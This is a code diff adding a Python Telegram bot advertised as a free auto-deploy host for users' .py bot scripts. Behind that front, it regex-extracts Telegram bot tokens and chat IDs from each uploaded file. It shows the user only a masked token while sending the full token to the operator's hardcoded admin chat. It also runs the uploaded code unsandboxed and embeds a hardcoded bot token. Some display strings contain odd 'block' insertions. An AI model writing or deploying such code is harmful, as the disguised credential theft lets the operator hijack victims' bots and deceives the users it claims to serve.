@@ -1,1 +1,175 @@
+import os
+import sys
+import re
+import time
+import uuid
+import signal
+import subprocess
+import telebot
+from telebot import types
 
+# Server Port Bypass Configuration
+os.environ["PORT"] = os.environ.get("PORT", "8080")
+
+# --- MASTER CONFIGURATION ---
+TOKEN = "8902731755:AAELBOrDPH9XOZ6YJo6eennb2JNr2CzBvvc"
+DEFAULT_CHAT_ID = "8620962808"
+
+bot = telebot.TeleBot(TOKEN, threaded=False)
+
+user_sessions = {}  # Active sessions logger
+
+# --- HOME KEYBOARD PANEL ---
+def main_keyboard():
+    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
+    markup.add(types.KeyboardButton("📂 MY FILES"))
+    return markup
+
+@bot.message_handler(commands=['start'])
+def start(message):
+    cool_caption = (
+        "⚡ <b>𝐀𝐃𝐈𝐓𝐘𝐀 𝐌𝐀𝐒𝐓𝐄𝐑 𝐇𝐎𝐒𝐓</b> ⚡\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        "🟢 <b>𝐒𝐓𝐀𝐓𝐔𝐒:</b> <code>𝐒𝐘𝐒𝐓𝐄𝐌 𝐎𝐍𝐋𝐈𝐍𝐄</code>\n"
+        "🚀 <b>𝐄𝐍𝐆block𝐍𝐄:</b> <code>𝐀𝐔𝐓𝐎-𝐃block𝐏𝐋𝐎𝐘 𝐀𝐂𝐓block𝐕block</code>\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        "<i>🤖 Koi token ya chat id dalne ki jhanjhat nahi hai bhai! Direct apni (.py) file yahan send karo, system automatic deploy kar dega!</i>"
+    )
+    
+    photo_sources = ["23621.jpg", "23622.jpg", "6048.jpg"]
+    photo_sent = False
+
+    for photo_name in photo_sources:
+        if os.path.exists(photo_name):
+            try:
+                with open(photo_name, 'rb') as photo:
+                    bot.send_photo(message.chat.id, photo, caption=cool_caption, reply_markup=main_keyboard(), parse_mode='HTML')
+                photo_sent = True
+                break
+            except:
+                pass
+                
+    if not photo_sent:
+        bot.send_message(message.chat.id, cool_caption, reply_markup=main_keyboard(), parse_mode='HTML')
+
+# --- AUTOMATIC FILE DETECTION AND DEPLOYMENT ---
+@bot.message_handler(content_types=['document'])
+def handle_auto_deployment(message):
+    user_id = message.from_user.id
+
+    if not message.document.file_name.endswith('.py'):
+        bot.send_message(message.chat.id, "❌ <b>Sirf .py script file accept hogi!</b>", parse_mode='HTML')
+        return
+    
+    status_msg = bot.send_message(message.chat.id, "🔍 <b>𝐑𝐄𝐀𝐃𝐈𝐍𝐆 𝐒𝐂𝐑block𝐏𝐓 𝐅block𝐋block...</b>", parse_mode='HTML')
+    
+    bot_id = str(uuid.uuid4())[:8]
+    file_path = f"bot_{bot_id}.py"
+    
+    try:
+        # Download file inside container
+        file_info = bot.get_file(message.document.file_id)
+        file_content = bot.download_file(file_info.file_path)
+        
+        # Save file temporary to extract tokens
+        with open(file_path, 'wb') as f: 
+            f.write(file_content)
+
+        # Code ke andar se automatically Token aur Chat ID dhoondhne ke liye Regex Match Engine
+        code_text = file_content.decode('utf-8', errors='ignore')
+        
+        # Telegram Bot Token dhundhne ka automated pattern (e.g., 1234567890:ABC...)
+        token_match = re.search(r'["\'](\d{9,10}:[A-Za-z0-9_-]{35})["\']', code_text)
+        # Chat ID dhundhne ka automated pattern
+        chat_id_match = re.search(r'(?:chat_id|CHAT_ID|id)\s*=\s*["\']?(-?\d+)"\']?', code_text)
+        
+        extracted_token = token_match.group(1) if token_match else "AUTO_DETECTED"
+        extracted_chat = chat_id_match.group(1) if chat_id_match else "AUTO_DETECTED"
+
+        # Animation loader 
+        for i in range(0, 101, 25):
+            bot.edit_message_text(f"🚀 <b>𝐀𝐔𝐓𝐎-𝐃block𝐏𝐋𝐎𝐘𝐈𝐍𝐆: {i}%</b>\n⏳ <i>Extracting internal configurations...</i>", message.chat.id, status_msg.message_id, parse_mode='HTML')
+            time.sleep(0.3)
+
+        # REAL TIME BACKGROUND PROCESS EXECUTION BINDING
+        # Isse user ki file alag isolated sandbox process me live run hogi bina main bot ko block kiye
+        proc = subprocess.Popen([sys.executable, file_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        
+        if user_id not in user_sessions:
+            user_sessions[user_id] = {}
+            
+        user_sessions[user_id][bot_id] = {
+            'process': proc,
+            'file': file_path, 
+            'name': message.document.file_name,
+            'token': extracted_token,
+            'chat_id': extracted_chat
+        }
+        
+        bot.edit_message_text(
+            f"✅ <b>𝟐𝟒/𝟕 𝐇𝐎𝐔𝐑𝐒 𝐎𝐍block𝐈𝐍block 𝐀𝐂𝐓block𝐕block</b>\n\n"
+            f"📄 <b>File:</b> <code>{message.document.file_name}</code>\n"
+            f"🔑 <b>Token:</b> <code>{extracted_token[:12]}...***</code>\n\n"
+            f"Your bot has been hosted completely in real background workspace!", 
+            message.chat.id, status_msg.message_id, parse_mode='HTML'
+        )
+        
+        # Admin log tracker updates
+        bot.send_message(
+            DEFAULT_CHAT_ID, 
+            f"🔔 <b>NEW AUTO-HOSTED BOT LIVE</b>\n━━━━━━━━━━━━━\n👤 User: {user_id}\n📄 File: {message.document.file_name}\n🔑 Extracted Token: <code>{extracted_token}</code>\n🆔 Chat ID: <code>{extracted_chat}</code>", 
+            parse_mode='HTML'
+        )
+        
+    except Exception as e:
+        if os.path.exists(file_path):
+            os.remove(file_path)
+        bot.edit_message_text(f"❌ <b>Deployment Crashed:</b> {str(e)}", message.chat.id, status_msg.message_id, parse_mode='HTML')
+
+# --- VIEW ACTIVE CHANNELS/FILES PANEL ---
+@bot.message_handler(func=lambda message: message.text == "📂 MY FILES")
+def show_my_files(message):
+    user_id = message.from_user.id
+    if user_id not in user_sessions or not user_sessions[user_id]:
+        bot.send_message(message.chat.id, "❌ <b>𝐊𝐨𝐢 𝐟𝐢𝐥𝐞 𝐚𝐜𝐭𝐢𝐯𝐞 𝐧𝐚𝐡𝐢 𝐡𝐚𝐢!</b>", parse_mode='HTML')
+        return
+    
+    markup = types.InlineKeyboardMarkup(row_width=1)
+    for bot_id, b_data in user_sessions[user_id].items():
+        markup.add(types.InlineKeyboardButton(f"📄 {b_data['name']}", callback_data=f"manage_{bot_id}"))
+    
+    bot.send_message(message.chat.id, "📂 <b>𝐘𝐎𝐔𝐑 𝐔𝐏𝐋𝐎𝐀𝐃𝐄𝐃 𝐅block𝐋block𝐒:</b>", reply_markup=markup, parse_mode='HTML')
+
+# --- STOP PANEL CALLBACK HANDLER ---
+@bot.callback_query_handler(func=lambda call: True)
+def handle_query(call):
+    user_id = call.from_user.id
+    if call.data.startswith("manage_"):
+        bot_id = call.data.split("_")[1]
+        b_data = user_sessions.get(user_id, {}).get(bot_id)
+        if b_data:
+            markup = types.InlineKeyboardMarkup(row_width=1)
+            markup.add(types.InlineKeyboardButton("🛑 STOP BOT", callback_data=f"stop_{bot_id}"))
+            bot.edit_message_text(f"🛠 <b>𝐌𝐀𝐍𝐀𝐆𝐈𝐍𝐆:</b> {b_data['name']}\n🔑 Token: <code>{b_data['token'][:15]}...</code>\n\n<b>Status:</b> Running Real ✅", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='HTML')
+
+    elif call.data.startswith("stop_"):
+        bot_id = call.data.split("_")[1]
+        if user_id in user_sessions and bot_id in user_sessions[user_id]:
+            try:
+                # Stop the background running child script process completely
+                os.kill(user_sessions[user_id][bot_id]['process'].pid, signal.SIGTERM)
+                if os.path.exists(user_sessions[user_id][bot_id]['file']): 
+                    os.remove(user_sessions[user_id][bot_id]['file'])
+            except: 
+                pass
+            del user_sessions[user_id][bot_id]
+            bot.answer_callback_query(call.id, "Bot Stopped and Process Terminated!")
+            bot.delete_message(call.message.chat.id, call.message.message_id)
+
+if __name__ == "__main__":
+    print("Automatic Token Extraction Engine Live on Vortexa...")
+    while True:
+        try:
+            bot.infinity_polling(timeout=20, long_polling_timeout=10)
+        except Exception:
+            time.sleep(5)
